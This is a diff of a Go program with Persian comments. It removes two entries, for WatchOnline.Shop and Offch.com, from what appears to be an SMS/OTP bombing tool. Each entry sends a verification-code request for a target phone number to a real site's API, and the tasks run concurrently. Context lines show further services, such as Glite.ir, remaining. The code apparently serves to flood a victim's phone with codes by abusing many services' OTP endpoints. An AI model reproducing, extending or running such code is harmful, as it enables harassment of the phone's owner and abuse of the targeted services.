@@ -540,32 +540,6 @@ func main() {
 			}
 		}(client, phone) // capture client and phone
 
-		// --- سرویس 11: WatchOnline.Shop ---
-		wg.Add(1)
-		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
-			return func() {
-				payload := map[string]interface{}{
-					"mobile": originalPhone, // فرمت 09...
-				}
-                // فراخوانی با اضافه کردن نام سرویس در جای درست
-				sendJSONRequest(c, ctx, "WatchOnline.Shop", "https://api.watchonline.shop/api/v1/otp/request", payload, &wg, ch)
-			}
-		}(client, phone) // capture client and phone
-
-		// --- سرویس 12: Offch.com ---
-		wg.Add(1)
-		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
-			return func() {
-				formData := url.Values{
-					"1_username":    {originalPhone}, // فرمت 09...
-					"1_invite_code": {""},
-				}
-                // فراخوانی با اضافه کردن نام سرویس در جای درست
-				sendFormRequest(c, ctx, "Offch.com", "https://www.offch.com/login", formData, &wg, ch)
-			}
-		}(client, phone) // capture client and phone
-
-
 		// --- سرویس 13: Glite.ir ---
 		wg.Add(1)
 		tasks <- func(c *http.Client, originalPhone string) func() { // capture client and phone
